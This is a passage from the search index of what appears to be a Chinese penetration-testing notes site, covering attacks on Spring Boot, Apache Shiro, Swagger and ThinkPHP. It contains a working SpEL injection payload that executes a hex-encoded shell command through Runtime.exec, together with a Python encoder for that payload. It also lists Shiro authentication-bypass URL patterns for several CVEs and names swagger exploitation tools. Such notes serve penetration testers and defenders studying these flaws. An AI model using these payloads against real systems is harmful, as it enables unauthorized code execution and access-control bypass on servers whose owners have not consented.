snakeyml"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#ref","text":"https://wolke.cn/post/115ad433.html","title":"REF:"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20boot/Spring%20boot/","text":"Spring boot \u76ee\u5f55 RCE whitelabel error page SpEL RCE CVE-2022-22965 RCE whitelabel error page SpEL RCE \u5229\u7528\u6761\u4ef6\uff1a spring boot 1.1.0-1.1.12\u30011.2.0-1.2.7\u30011.3.0 \u81f3\u5c11\u77e5\u9053\u4e00\u4e2a\u89e6\u53d1 springboot \u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u7684\u63a5\u53e3\u53ca\u53c2\u6570\u540d \u5229\u7528\u65b9\u6cd5\uff1a \u6b65\u9aa4\u4e00\uff1a\u627e\u5230\u4e00\u4e2a\u6b63\u5e38\u4f20\u53c2\u5904 \u6bd4\u5982\u53d1\u73b0\u8bbf\u95ee /article?id=xxx \uff0c\u9875\u9762\u4f1a\u62a5\u72b6\u6001\u7801\u4e3a 500 \u7684\u9519\u8bef\uff1a Whitelabel Error Page \uff0c\u5219\u540e\u7eed payload \u90fd\u5c06\u4f1a\u5728\u53c2\u6570 id \u5904\u5c1d\u8bd5\u3002 \u6b65\u9aa4\u4e8c\uff1a\u6267\u884c SpEL \u8868\u8fbe\u5f0f \u8f93\u5165 /article?id=${7*7} \uff0c\u5982\u679c\u53d1\u73b0\u62a5\u9519\u9875\u9762\u5c06 7*7 \u7684\u503c 49 \u8ba1\u7b97\u51fa\u6765\u663e\u793a\u5728\u62a5\u9519\u9875\u9762\u4e0a\uff0c\u90a3\u4e48\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a\u76ee\u6807\u5b58\u5728 SpEL \u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e\u3002 \u7531\u5b57\u7b26\u4e32\u683c\u5f0f\u8f6c\u6362\u6210 0x** java \u5b57\u8282\u5f62\u5f0f\uff0c\u65b9\u4fbf\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff1a coding: utf-8 result = \"\" target = 'open -a Calculator' for x in target: result += hex(ord(x)) + \",\" print(result.rstrip(',')) \u6267\u884c open -a Calculator \u547d\u4ee4 \u6267\u884c `open -a Calculator`\u547d\u4ee4\uff1a [http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}](http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72})))} CVE-2022-22965 \u4efb\u610f\u6587\u4ef6\u5199\uff0c\u76f4\u63a5\u5199shell https://www.freebuf.com/vuls/345007.html","title":"Spring boot"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20boot/Spring%20boot/#spring-boot","text":"","title":"Spring boot"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20boot/Spring%20boot/#_1","text":"RCE whitelabel error page SpEL RCE CVE-2022-22965","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20boot/Spring%20boot/#rce","text":"","title":"RCE"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20boot/Spring%20boot/#whitelabel-error-page-spel-rce","text":"\u5229\u7528\u6761\u4ef6\uff1a spring boot 1.1.0-1.1.12\u30011.2.0-1.2.7\u30011.3.0 \u81f3\u5c11\u77e5\u9053\u4e00\u4e2a\u89e6\u53d1 springboot \u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u7684\u63a5\u53e3\u53ca\u53c2\u6570\u540d \u5229\u7528\u65b9\u6cd5\uff1a \u6b65\u9aa4\u4e00\uff1a\u627e\u5230\u4e00\u4e2a\u6b63\u5e38\u4f20\u53c2\u5904 \u6bd4\u5982\u53d1\u73b0\u8bbf\u95ee /article?id=xxx \uff0c\u9875\u9762\u4f1a\u62a5\u72b6\u6001\u7801\u4e3a 500 \u7684\u9519\u8bef\uff1a Whitelabel Error Page \uff0c\u5219\u540e\u7eed payload \u90fd\u5c06\u4f1a\u5728\u53c2\u6570 id \u5904\u5c1d\u8bd5\u3002 \u6b65\u9aa4\u4e8c\uff1a\u6267\u884c SpEL \u8868\u8fbe\u5f0f \u8f93\u5165 /article?id=${7*7} \uff0c\u5982\u679c\u53d1\u73b0\u62a5\u9519\u9875\u9762\u5c06 7*7 \u7684\u503c 49 \u8ba1\u7b97\u51fa\u6765\u663e\u793a\u5728\u62a5\u9519\u9875\u9762\u4e0a\uff0c\u90a3\u4e48\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a\u76ee\u6807\u5b58\u5728 SpEL \u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e\u3002 \u7531\u5b57\u7b26\u4e32\u683c\u5f0f\u8f6c\u6362\u6210 0x** java \u5b57\u8282\u5f62\u5f0f\uff0c\u65b9\u4fbf\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff1a coding: utf-8 result = \"\" target = 'open -a Calculator' for x in target: result += hex(ord(x)) + \",\" print(result.rstrip(',')) \u6267\u884c open -a Calculator \u547d\u4ee4 \u6267\u884c `open -a Calculator`\u547d\u4ee4\uff1a [http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}](http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72})))}","title":"whitelabel error page SpEL RCE"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20boot/Spring%20boot/#cve-2022-22965","text":"\u4efb\u610f\u6587\u4ef6\u5199\uff0c\u76f4\u63a5\u5199shell https://www.freebuf.com/vuls/345007.html","title":"CVE-2022-22965"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/","text":"shiro \u76ee\u5f55 \u7206key\u62ffshell \u6743\u9650\u7ed5\u8fc7 CVE-2016-6802 CVE-2020-1957 CVE-2020-11989 CVE-2020-13933 CVE-2020-17510 CVE-2020-17523 \u7206key\u62ffshell \u4e0d\u7528\u8bf4\u4e86\uff0c\u57fa\u64cd\u4e86 \u6743\u9650\u7ed5\u8fc7 \u5728shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u4e2d\uff0c\u5229\u7528\u7684\u95ee\u9898\u662fshiro\u62e6\u622a\u5668\u5148\u4e8espring boot\u6267\u884c\uff0c\u5e76\u4e14\u4e8c\u8005\u7684\u5339\u914d\u6a21\u5f0f\u4e0d\u540c\uff0c\u6700\u7ec8\u5bfc\u81f4\u8bbf\u95ee\u7684url1\u548cshiro\u5904\u7406\u7684url2\u4ee5\u53caspring\u8def\u7531\u7684url3\u4e0d\u540c\uff0c\u5bfc\u81f4shiro\u62e6\u622a\u5668\u8d77\u4e0d\u5230\u5e94\u6709\u7684\u4f5c\u7528\u4ece\u800c\u88ab\u7ed5\u8fc7\u3002 shiro\u6846\u67b6\u901a\u8fc7\u62e6\u622a\u5668\u6765\u5b9e\u73b0\u5bf9\u7528\u6237\u8bbf\u95ee\u6743\u9650\u7684\u63a7\u5236\u548c\u62e6\u622a\u3002Shiro\u5e38\u89c1\u7684\u62e6\u622a\u5668\u6709anon,authc\u7b49\u3002 \uff5c anon\uff1a\u533f\u540d\u62e6\u622a\u5668\uff0c\u4e0d\u9700\u767b\u5f55\u5c31\u80fd\u8bbf\u95ee\uff0c\u4e00\u822c\u7528\u4e8e\u9759\u6001\u8d44\u6e90\uff0c\u6216\u8005\u79fb\u52a8\u7aef\u63a5\u53e3\u3002\u5982\u767b\u9646\uff0c\u5fd8\u8bb0\u5bc6\u7801\uff0cjs\u7b49 authc\uff1a\u767b\u5f55\u62e6\u622a\u5668\uff0c\u9700\u8981\u767b\u5f55\u8ba4\u8bc1\u624d\u80fd\u8bbf\u95ee\u7684\u8d44\u6e90\u3002\u6211\u4eec\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u9700\u8981\u767b\u5f55\u624d\u53ef\u8bbf\u95ee\u7684url\uff0c\u5b9e\u73b0\u5bf9url\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u5176\u4e2d\uff0curl\u7684\u8def\u5f84\u8868\u8fbe\u5f0f\u4e3aAnt\u683c\u5f0f\u3002?\uff1a\u5339\u914d\u4e00\u4e2a\u5b57\u7b26 *\uff1a\u5339\u914d\u96f6\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26\u4e32 **\uff1a\u5339\u914d\u8def\u5f84\u4e2d\u7684\u96f6\u4e2a\u6216\u591a\u4e2a\u8def\u5f84 CVE-2016-6802 \u5229\u7528\u6761\u4ef6 shrio<1.3.2 \u5229\u7528\u65b9\u6cd5 \u5728\u8bbf\u95ee\u8def\u5f84\u524d\u52a0\u4e0a/\u4efb\u610f\u76ee\u5f55\u540d/../\uff0c\u5373\u53ef\u7ed5\u8fc7\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee\uff1a http://127.0.0.1:8080/samples-web-1.2.4/account/index.jsp bypass\uff1a http://127.0.0.1:8080/aaa/../samples-web-1.2.4/account/index.jsp CVE-2020-1957 \u5229\u7528\u6761\u4ef6 Apache Shiro <= 1.5.1 \uff0c Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u5229\u7528\u65b9\u6cd5 /demo/..;/admin/index \uff08\u5176\u4e2ddemo\u4e3a\u6388\u6743\u8def\u5f84\uff0cadmin/index\u4e3a\u9274\u6743\u8def\u5f84\uff09 CVE-2020-11989 \u5229\u7528\u6761\u4ef6\uff1a Apache Shiro <= 1.5.2 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\uff0c \u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxx/* \u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f/xxx/{variable}\u4e14variable\u7684\u7c7b\u578b\u5fc5\u987b\u662fString\uff08\u5982@Requestmapping=/admin/{name}) \u5229\u7528\u65b9\u6cd5\uff1aadmin/page%252fABCDEFG\uff0c\u5176\u4e2dadmin/page\u4e3a\u9274\u6743\u8def\u5f84\uff0cABCDEFG\u4e3a\u968f\u610f\u5b57\u7b26\u4e32 CVE-2020-13933 \u5b9e\u8d28\u4e0a\u662f\u5bf911989\u7684\u7ed5\u8fc7 \u5229\u7528\u6761\u4ef6 Apache Shiro < 1.6.0 Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxxx/* \u540c\u65f6\u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f /xxx/{variable} \u4e14 variable \u7684\u7c7b\u578b\u5fc5\u987b\u662f String \u5229\u7528\u65b9\u6cd5\uff1a/srpingboot_shiro_war/admin/%3bABCDEFG CVE-2020-17510 \u4e5f\u662fbypass Shiro < 1.7.0 Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxxx/* \u540c\u65f6\u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f /xxx/{variable} \u4e14 variable \u7684\u7c7b\u578b\u5fc5\u987b\u662f String \u5229\u7528\u65b9\u6cd5 /admin/%2e \u4ee5\u4e0bpaylaod\u90fd\u53ef\u7528 /%2e /%2e/ /%2e%2e /%2e%2e/ CVE-2020-17523 \u4e5f\u53ef\u4ee5\u662f\u628a\u5b83\u770b\u4f5cCVE-2020-13933\u7684\u7ed5\u8fc7 \u5229\u7528\u6761\u4ef6 Apache Shiro < 1.7.1 Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxxx/* \u540c\u65f6\u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f /xxx/{variable} \u4e14 variable \u7684\u7c7b\u578b\u5fc5\u987b\u662f String \u5229\u7528\u65b9\u6cd5 /srpingboot_shiro_war/admin/%20","title":"shiro"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#shiro","text":"","title":"shiro"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#_1","text":"\u7206key\u62ffshell \u6743\u9650\u7ed5\u8fc7 CVE-2016-6802 CVE-2020-1957 CVE-2020-11989 CVE-2020-13933 CVE-2020-17510 CVE-2020-17523","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#keyshell","text":"\u4e0d\u7528\u8bf4\u4e86\uff0c\u57fa\u64cd\u4e86","title":"\u7206key\u62ffshell"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#_2","text":"\u5728shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u4e2d\uff0c\u5229\u7528\u7684\u95ee\u9898\u662fshiro\u62e6\u622a\u5668\u5148\u4e8espring boot\u6267\u884c\uff0c\u5e76\u4e14\u4e8c\u8005\u7684\u5339\u914d\u6a21\u5f0f\u4e0d\u540c\uff0c\u6700\u7ec8\u5bfc\u81f4\u8bbf\u95ee\u7684url1\u548cshiro\u5904\u7406\u7684url2\u4ee5\u53caspring\u8def\u7531\u7684url3\u4e0d\u540c\uff0c\u5bfc\u81f4shiro\u62e6\u622a\u5668\u8d77\u4e0d\u5230\u5e94\u6709\u7684\u4f5c\u7528\u4ece\u800c\u88ab\u7ed5\u8fc7\u3002 shiro\u6846\u67b6\u901a\u8fc7\u62e6\u622a\u5668\u6765\u5b9e\u73b0\u5bf9\u7528\u6237\u8bbf\u95ee\u6743\u9650\u7684\u63a7\u5236\u548c\u62e6\u622a\u3002Shiro\u5e38\u89c1\u7684\u62e6\u622a\u5668\u6709anon,authc\u7b49\u3002 \uff5c anon\uff1a\u533f\u540d\u62e6\u622a\u5668\uff0c\u4e0d\u9700\u767b\u5f55\u5c31\u80fd\u8bbf\u95ee\uff0c\u4e00\u822c\u7528\u4e8e\u9759\u6001\u8d44\u6e90\uff0c\u6216\u8005\u79fb\u52a8\u7aef\u63a5\u53e3\u3002\u5982\u767b\u9646\uff0c\u5fd8\u8bb0\u5bc6\u7801\uff0cjs\u7b49 authc\uff1a\u767b\u5f55\u62e6\u622a\u5668\uff0c\u9700\u8981\u767b\u5f55\u8ba4\u8bc1\u624d\u80fd\u8bbf\u95ee\u7684\u8d44\u6e90\u3002\u6211\u4eec\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u9700\u8981\u767b\u5f55\u624d\u53ef\u8bbf\u95ee\u7684url\uff0c\u5b9e\u73b0\u5bf9url\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u5176\u4e2d\uff0curl\u7684\u8def\u5f84\u8868\u8fbe\u5f0f\u4e3aAnt\u683c\u5f0f\u3002?\uff1a\u5339\u914d\u4e00\u4e2a\u5b57\u7b26 *\uff1a\u5339\u914d\u96f6\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26\u4e32 **\uff1a\u5339\u914d\u8def\u5f84\u4e2d\u7684\u96f6\u4e2a\u6216\u591a\u4e2a\u8def\u5f84","title":"\u6743\u9650\u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#cve-2016-6802","text":"\u5229\u7528\u6761\u4ef6 shrio<1.3.2 \u5229\u7528\u65b9\u6cd5 \u5728\u8bbf\u95ee\u8def\u5f84\u524d\u52a0\u4e0a/\u4efb\u610f\u76ee\u5f55\u540d/../\uff0c\u5373\u53ef\u7ed5\u8fc7\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee\uff1a http://127.0.0.1:8080/samples-web-1.2.4/account/index.jsp bypass\uff1a http://127.0.0.1:8080/aaa/../samples-web-1.2.4/account/index.jsp","title":"CVE-2016-6802"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#cve-2020-1957","text":"\u5229\u7528\u6761\u4ef6 Apache Shiro <= 1.5.1 \uff0c Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u5229\u7528\u65b9\u6cd5 /demo/..;/admin/index \uff08\u5176\u4e2ddemo\u4e3a\u6388\u6743\u8def\u5f84\uff0cadmin/index\u4e3a\u9274\u6743\u8def\u5f84\uff09","title":"CVE-2020-1957"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#cve-2020-11989","text":"\u5229\u7528\u6761\u4ef6\uff1a Apache Shiro <= 1.5.2 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\uff0c \u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxx/* \u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f/xxx/{variable}\u4e14variable\u7684\u7c7b\u578b\u5fc5\u987b\u662fString\uff08\u5982@Requestmapping=/admin/{name}) \u5229\u7528\u65b9\u6cd5\uff1aadmin/page%252fABCDEFG\uff0c\u5176\u4e2dadmin/page\u4e3a\u9274\u6743\u8def\u5f84\uff0cABCDEFG\u4e3a\u968f\u610f\u5b57\u7b26\u4e32","title":"CVE-2020-11989"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#cve-2020-13933","text":"\u5b9e\u8d28\u4e0a\u662f\u5bf911989\u7684\u7ed5\u8fc7 \u5229\u7528\u6761\u4ef6 Apache Shiro < 1.6.0 Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxxx/* \u540c\u65f6\u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f /xxx/{variable} \u4e14 variable \u7684\u7c7b\u578b\u5fc5\u987b\u662f String \u5229\u7528\u65b9\u6cd5\uff1a/srpingboot_shiro_war/admin/%3bABCDEFG","title":"CVE-2020-13933"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#cve-2020-17510","text":"\u4e5f\u662fbypass Shiro < 1.7.0 Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxxx/* \u540c\u65f6\u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f /xxx/{variable} \u4e14 variable \u7684\u7c7b\u578b\u5fc5\u987b\u662f String \u5229\u7528\u65b9\u6cd5 /admin/%2e \u4ee5\u4e0bpaylaod\u90fd\u53ef\u7528 /%2e /%2e/ /%2e%2e /%2e%2e/","title":"CVE-2020-17510"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/shiro/shiro/#cve-2020-17523","text":"\u4e5f\u53ef\u4ee5\u662f\u628a\u5b83\u770b\u4f5cCVE-2020-13933\u7684\u7ed5\u8fc7 \u5229\u7528\u6761\u4ef6 Apache Shiro < 1.7.1 Spring \u6846\u67b6\u4e2d\u53ea\u4f7f\u7528 Shiro \u9274\u6743 \u9700\u8981\u540e\u7aef\u7279\u5b9a\u7684\u683c\u5f0f\u624d\u53ef\u8fdb\u884c\u89e6\u53d1\u5373\uff1aShiro\u6743\u9650\u914d\u7f6e\u5fc5\u987b\u4e3a /xxxx/* \u540c\u65f6\u540e\u7aef\u903b\u8f91\u5fc5\u987b\u662f /xxx/{variable} \u4e14 variable \u7684\u7c7b\u578b\u5fc5\u987b\u662f String \u5229\u7528\u65b9\u6cd5 /srpingboot_shiro_war/admin/%20","title":"CVE-2020-17523"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/struts/struts/","text":"struts","title":"struts"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/struts/struts/#struts","text":"","title":"struts"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/","text":"swagger \u76ee\u5f55 \u6e17\u900f \u53ea\u6709api-docs \u6279\u91cf\u6d4b\u8bd5 \u626b\u63cf \u6d4b\u8bd5\u7ad9\u70b9\u53ea\u652f\u6301https\u534f\u8bae\uff0c\u4f46\u662f\u4f7f\u7528\u6d4f\u89c8\u5668\u8fdb\u884c\u63a5\u53e3\u8c03\u7528\u65f6\u4f7f\u7528http\u534f\u8bae \u6e17\u900f \u53ea\u6709api-docs https://chrome.google.com/webstore/detail/swagger-ui/liacakmdhalagfjlfdofigfoiocghoej \u4f7f\u7528\u8be5\u63d2\u4ef6\u89e3\u6790\u6587\u6863\u5e76\u751f\u6210\u6d4b\u8bd5\u754c\u9762 \u6279\u91cf\u6d4b\u8bd5 https://github.com/jayus0821/swagger-hack https://github.com/lijiejie/swagger-exp \u626b\u63cf onescan burp\u63d2\u4ef6 github\uff08\u81ea\u5df1\u52a0\u8def\u5f84\uff0c\u7136\u540e\u7ed9\u722c\u866b\u626b\u63cf\uff09 \u6d4b\u8bd5\u7ad9\u70b9\u53ea\u652f\u6301https\u534f\u8bae\uff0c\u4f46\u662f\u4f7f\u7528\u6d4f\u89c8\u5668\u8fdb\u884c\u63a5\u53e3\u8c03\u7528\u65f6\u4f7f\u7528http\u534f\u8bae https://github.com/lijiejie/swagger-exp \u8fd9\u79cd\u60c5\u51b5\u63a8\u8350\u4f7f\u7528swagger-exp \u5c06\u6cc4\u9732\u7684json\u683c\u5f0f\u5185\u5bb9\u590d\u5236\u5230\u5de5\u5177\u540c\u76ee\u5f55\u4e0b\u7684api-docs.json\u4e2d\uff0c\u5728basepath\u540e\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9 \"schemes\": [\"https\", \"http\"], \u7136\u540e\u6267\u884cPython swagger-exp.py \u5728\u672c\u5730\u76d1\u542c\u4e00\u4e2aWeb Server\uff0c\u6253\u5f00Swagger UI\u754c\u9762\uff0c\u4f9b\u5206\u6790\u63a5\u53e3\u4f7f\u7528","title":"swagger"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/#swagger","text":"","title":"swagger"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/#_1","text":"\u6e17\u900f \u53ea\u6709api-docs \u6279\u91cf\u6d4b\u8bd5 \u626b\u63cf \u6d4b\u8bd5\u7ad9\u70b9\u53ea\u652f\u6301https\u534f\u8bae\uff0c\u4f46\u662f\u4f7f\u7528\u6d4f\u89c8\u5668\u8fdb\u884c\u63a5\u53e3\u8c03\u7528\u65f6\u4f7f\u7528http\u534f\u8bae","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/#_2","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/#api-docs","text":"https://chrome.google.com/webstore/detail/swagger-ui/liacakmdhalagfjlfdofigfoiocghoej \u4f7f\u7528\u8be5\u63d2\u4ef6\u89e3\u6790\u6587\u6863\u5e76\u751f\u6210\u6d4b\u8bd5\u754c\u9762","title":"\u53ea\u6709api-docs"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/#_3","text":"https://github.com/jayus0821/swagger-hack https://github.com/lijiejie/swagger-exp","title":"\u6279\u91cf\u6d4b\u8bd5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/#_4","text":"onescan burp\u63d2\u4ef6 github\uff08\u81ea\u5df1\u52a0\u8def\u5f84\uff0c\u7136\u540e\u7ed9\u722c\u866b\u626b\u63cf\uff09","title":"\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/swagger/swagger/#httpshttp","text":"https://github.com/lijiejie/swagger-exp \u8fd9\u79cd\u60c5\u51b5\u63a8\u8350\u4f7f\u7528swagger-exp \u5c06\u6cc4\u9732\u7684json\u683c\u5f0f\u5185\u5bb9\u590d\u5236\u5230\u5de5\u5177\u540c\u76ee\u5f55\u4e0b\u7684api-docs.json\u4e2d\uff0c\u5728basepath\u540e\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9 \"schemes\": [\"https\", \"http\"], \u7136\u540e\u6267\u884cPython swagger-exp.py \u5728\u672c\u5730\u76d1\u542c\u4e00\u4e2aWeb Server\uff0c\u6253\u5f00Swagger UI\u754c\u9762\uff0c\u4f9b\u5206\u6790\u63a5\u53e3\u4f7f\u7528","title":"\u6d4b\u8bd5\u7ad9\u70b9\u53ea\u652f\u6301https\u534f\u8bae\uff0c\u4f46\u662f\u4f7f\u7528\u6d4f\u89c8\u5668\u8fdb\u884c\u63a5\u53e3\u8c03\u7528\u65f6\u4f7f\u7528http\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/thinkphp/thinkphp/","text":"thinkphp \u76ee\u5f55 \u63a2\u6d4b \u7248\u672c \u6e17\u900f \u6f0f\u6d1e\u5e93 \u63a2\u6d4b \u7248\u672c \u968f\u4fbf\u8f93\u5165\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8def\u7531\u7136\u540e\u67e5\u770b\u9519\u8bef\u4fe1\u606f\u5982http\\://x.x.x.x/gfvhf \u6e17\u900f \u6f0f\u6d1e\u5e93 https://wiki.96.mk/Web\u5b89\u5168/Thinkphp/Thinkphp 5.x \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e/Thinkphp 